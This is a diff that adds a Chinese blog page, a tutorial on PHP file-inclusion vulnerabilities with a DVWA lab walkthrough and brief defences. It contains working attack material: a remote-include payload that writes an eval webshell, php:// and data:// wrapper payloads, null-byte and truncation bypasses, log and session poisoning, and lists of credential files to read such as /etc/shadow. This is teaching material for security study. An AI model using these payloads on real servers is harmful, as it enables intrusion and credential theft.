@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>web安全-文件包含 | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="web安全">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>web安全-文件包含</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">web安全-文件包含</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-02-04T14:25:43.009Z" itemprop="datePublished" class="page-time">
+  2021-02-04
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-文件包含"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">web安全-文件包含</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-02-04 22:25:43" datetime="2021-02-04T14:25:43.009Z"  itemprop="datePublished">2021-02-04</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>Author:<code>wisejay</code></p>
+<p>Email:<code>wisejay@foxmail.com</code></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件包含（File Inclusion）即程序通过[包含函数]调用本地或远程文件，以此来实现拓展功能。当被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行。</p>
+<h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><ul>
+<li><code>include()</code><ul>
+<li>包含失败会返回警告，文件继续向下执行</li>
+</ul>
+</li>
+<li><code>include_once()</code><ul>
+<li>与include()一样只不过会做once检测，如果文件被包含过，就不会再包含</li>
+</ul>
+</li>
+<li><code>require()</code><ul>
+<li>包含失败会返回错误，文件不会向下执行</li>
+</ul>
+</li>
+<li><code>require_once()</code><ul>
+<li>与require()一样只不过会做once检测，如果文件被包含过，就不会再包含</li>
+</ul>
+</li>
+</ul>
+<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"php.txt"</span>)    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php.txt 文件在本地</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span><span class="string">"hello php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>修改php.txt的扩展名为jpg、rar、aa等都可以解析，只要文件内容符合php语法规范，任何扩展名都可以被php解析</code></p>
+<figure class="image-box">
+                <a rel=web安全-文件包含 href="/img/文件包含/1597760772166.png" title="1597760772166" data-fancybox="images"><img src="/img/文件包含/1597760772166.png" alt="1597760772166" title class></a>
+                <p>1597760772166</p>
+            </figure>
+
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>需要<code>php.ini</code>服务开启<code>allow_url_fopen</code>和<code>allow_url_include</code>为ON</p>
+<ul>
+<li>allow_url_fopen = On (允许打开URL文件,预设启用)</li>
+<li>allow_url_include = Off (允许引用URL文件,预设关闭)</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#hello.txt 文件不在本地</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span><span class="string">"hello world"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=web安全-文件包含 href="/img/文件包含/1597760759559.png" title="1597760759559" data-fancybox="images"><img src="/img/文件包含/1597760759559.png" alt="1597760759559" title class></a>
+                <p>1597760759559</p>
+            </figure>
+
+<blockquote>
+<p>通过远程文件包含包含<code>1.txt</code>，在服务器生成一句话木马<code>shell.php</code></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.txt</span></span><br><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd // 账户信息</span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">file://</td>
+<td align="center">访问本地文件系统</td>
+</tr>
+<tr>
+<td align="center">http://</td>
+<td align="center">访问HTTP(s)网址</td>
+</tr>
+<tr>
+<td align="center">ftp://</td>
+<td align="center">访问FTP(S)URLs</td>
+</tr>
+<tr>
+<td align="center">php://</td>
+<td align="center">访问各个输入/输出流(I/O streams)</td>
+</tr>
+<tr>
+<td align="center">zlib://</td>
+<td align="center">压缩流</td>
+</tr>
+<tr>
+<td align="center">data://</td>
+<td align="center">数据</td>
+</tr>
+<tr>
+<td align="center">glob://</td>
+<td align="center">查找匹配的文件路径模式</td>
+</tr>
+<tr>
+<td align="center">rar://</td>
+<td align="center">RAR</td>
+</tr>
+</tbody></table>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><table>
+<thead>
+<tr>
+<th align="center">协议</th>
+<th align="center">PHP版本</th>
+<th align="center">allow_url_fopen</th>
+<th align="center">allow_url_include</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">file://</td>
+<td align="center">&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td>?file=file://C:/phpStudy/PHPTutorial/www/phpcode.txt</td>
+</tr>
+<tr>
+<td align="center">php://filter</td>
+<td align="center">&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
+</tr>
+<tr>
+<td align="center">php://input</td>
+<td align="center">&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">on</td>
+<td>?file=php://input  [POST DATA] <?php phpinfo()?></td>
+</tr>
+<tr>
+<td align="center">compress.bzip2://</td>
+<td align="center">&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td>?file=compress.bzip2://C:/soft?phpstudy/www/file.bz2</td>
+</tr>
+<tr>
+<td align="center">compress:zlib://</td>
+<td align="center">&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td>?file=compress.zbli://./file.gz</td>
+</tr>
+<tr>
+<td align="center">data://</td>
+<td align="center">&gt;=5.2</td>
+<td align="center">on</td>
+<td align="center">on</td>
+<td>?file=data://text/plain,<?php phpinfo()?>  或者 ?file=data://text/plain,base64,PD9waHAgcGhwaW5mbygpPz4=</td>
+</tr>
+<tr>
+<td align="center">zip://</td>
+<td align="center">&gt;=5.2</td>
+<td align="center">off/on</td>
+<td align="center">off/on</td>
+<td>?file=zip://D:/soft/phpstudy/www/file.zip%23phpcode.txt</td>
+</tr>
+</tbody></table>
+<h3 id="截断后缀"><a href="#截断后缀" class="headerlink" title="截断后缀"></a>截断后缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>本地包含截断</strong></p>
+<ul>
+<li><code>%00</code>截断<ul>
+<li><code>?filename=../../../../../../../boot.ini%00</code></li>
+</ul>
+</li>
+<li>路径长度截断：windows OS，点号需要长于256；linux OS 长于4096Windows下目录最大长度为256字节，超出的部分会被丢弃；Linux下目录最大长度为4096字节，超出的部分会被丢弃。<ul>
+<li><code>?filename=test.txt/./././././</code>(这里省略了大部分<code>./</code>)</li>
+</ul>
+</li>
+<li>点号截断：windows OS，点号需要长于256<ul>
+<li><code>?filename=test.txt...................</code>（同理这里省略了大部分<code>.</code>）</li>
+</ul>
+</li>
+</ul>
+<p><strong>远程包含阶段</strong></p>
+<ul>
+<li><code>?</code>号绕过<ul>
+<li><code>?filename=http://192.168.1.1/php.txt?</code></li>
+</ul>
+</li>
+<li><code>#</code>号绕过<ul>
+<li><code>?filename=http://192.168.1.1/php.txt%23</code></li>
+</ul>
+</li>
+<li>空格绕过<ul>
+<li><code>?filename=http://192.168.1.1/php.txt%20</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="Apache日志包含"><a href="#Apache日志包含" class="headerlink" title="Apache日志包含"></a>Apache日志包含</h3><blockquote>
+<p>当访问不存在的资源时，apache日志同样会记录</p>
+</blockquote>
+<p>我们可以访问<code>127.0.0.1/include/&lt;?php phpinfo();?&gt;</code>然后利用文件包含漏洞包含<code>access.log文件</code></p>
+<h3 id="Session包含"><a href="#Session包含" class="headerlink" title="Session包含"></a>Session包含</h3><blockquote>
+<p>一般我们可以通过phpinfo()函数查看session存放的位置，session的文件名为sess+sessionid，sessionid可以通过开发者模式获取，然后通过文件包含查看session内容，通过内容来分析那些内容可以写入session中，然后通过构造payload传入到session中，从而达到漏洞利用目的。</p>
+</blockquote>
+<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p><code>这里已经利用文件上传漏洞，把包含文件上传到\DVWA\hackable\uploads下</code></p>
+<h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><blockquote>
+<p>这里没有进行任何过滤，我们直接包含本地文件就成功了</p>
+</blockquote>
+<p><code>http://192.168.65.128/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.php</code></p>
+<figure class="image-box">
+                <a rel=web安全-文件包含 href="/img/文件包含/1597902587538.png" title="1597902587538" data-fancybox="images"><img src="/img/文件包含/1597902587538.png" alt="1597902587538" title class></a>
+                <p>1597902587538</p>
+            </figure>
+
+<h3 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h3><blockquote>
+<p>这里我们和前面一样尝试没有成功，然后尝试绝对路径就成功了，因为这里过滤了<code>../和..\</code></p>
+</blockquote>
+<p><code>?page=C:\phpStudy\PHPTutorial\WWW\DVWA\hackable\uploads\shell.php</code></p>
+<figure class="image-box">
+                <a rel=web安全-文件包含 href="/img/文件包含/1597902875445.png" title="1597902875445" data-fancybox="images"><img src="/img/文件包含/1597902875445.png" alt="1597902875445" title class></a>
+                <p>1597902875445</p>
+            </figure>
+
+<h3 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h3><blockquote>
+<p>这里限制了文件协议必须为file，所以我们采用file协议绕过</p>
+</blockquote>
+<p><code>?page=file://C:\phpStudy\PHPTutorial\WWW\DVWA\hackable\uploads\shell.php</code></p>
+<figure class="image-box">
+                <a rel=web安全-文件包含 href="/img/文件包含/1597903657754.png" title="1597903657754" data-fancybox="images"><img src="/img/文件包含/1597903657754.png" alt="1597903657754" title class></a>
+                <p>1597903657754</p>
+            </figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li>尽量不要使用文件包含代码，并且关闭包含选项</li>
+<li>如果必须要用文件包含，要把路径和名称写死</li>
+</ol>
+<hr>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2021-02-04T14:26:29.951Z" itemprop="dateUpdated">2021-02-04 22:26:29</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2021/02/04/文件包含/" target="_blank" rel="external">http://wisejay.top/2021/02/04/文件包含/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.top">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/02/04/文件包含/&title=《web安全-文件包含》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/02/04/文件包含/&title=《web安全-文件包含》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2021/02/04/命令执行/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">web安全-命令执行</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2021/02/03/文件上传/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">web安全-文件上传</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#文件包含"><span class="post-toc-number">1.</span> <span class="post-toc-text">文件包含</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#文件包含函数"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">文件包含函数</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞产生"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">漏洞产生</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#本地文件包含"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">本地文件包含</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#远程文件包含"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">远程文件包含</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#常见的敏感信息路径"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">常见的敏感信息路径</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#windows"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">windows</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LINUX"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">LINUX</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#伪协议"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">伪协议</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用"><span class="post-toc-number">1.4.1.1.</span> <span class="post-toc-text">利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#截断后缀"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">截断后缀</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Apache日志包含"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">Apache日志包含</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Session包含"><span class="post-toc-number">1.4.4.</span> <span class="post-toc-text">Session包含</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场练习"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">靶场练习</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LOW"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">LOW</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MEDIUM"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">MEDIUM</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#HIGH"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">HIGH</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防御"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">防御</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2021
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/02/04/文件包含/&title=《web安全-文件包含》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/02/04/文件包含/&title=《web安全-文件包含》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACI0lEQVR42u3aS47jMAwFwNz/0untDBpxHkm5AUulVWA4tsoLQvy8XvF6/1qfrl+vf/91/ZbXHQsDA+OxjPzFd1+pfiYMDIzTGJ8iWPL7OlAmm0je9WXPGBgYGK2D3eQKBgYGxoSxNgHO78HAwMDIC2TXB7ukcJY/7ZZcHAMD44GMPGj+/e9b+hsYGBiPYvQakEmhrbetd2thYGDszchfUz2cVZ+54L8YGBibMiYbmhTO8uJaRMXAwNiacUexrFo4y/fwJRBjYGBsysjHRtcWzqrDZKMeKQYGxkaMPAQno13VTY/aEhgYGMczkkB8fZirDk+MWpgYGBibMnrp66qPkqSsX56MgYGxNeM6XpWTybjE1huNLQ9bYGBgbMGojlBUGwOrmgrRtAgGBsbWjGoTsZqa5oNfvfIfBgbG3oxe6b8acPOPVU1ro64sBgbGRowk/M2Tz+q7eoU/DAyM0xi9gJsfDZNnjsIuBgbG1oxec3HBQGrxEImBgXECYz6KmpfqbkxlMTAwDmDMS2zVoa7q4fJLyMbAwDiAMSEVWoytY2KheYmBgbEd411c1fCa39ML9P/NjGBgYGzKmBfdksZksvVqG6AXrDEwMJ7LSIJsHnDzI2N+DwYGBkY18FWT0mqQrY6AYGBgYExOmkmCOnnyKOBiYGAcw0hesPZzfAzfGBgYBzDyYn2elK56TnTQxMDA2JrRSx3zcbFe4zMp4WFgYBzA+AE1qJNhkvzZ9wAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
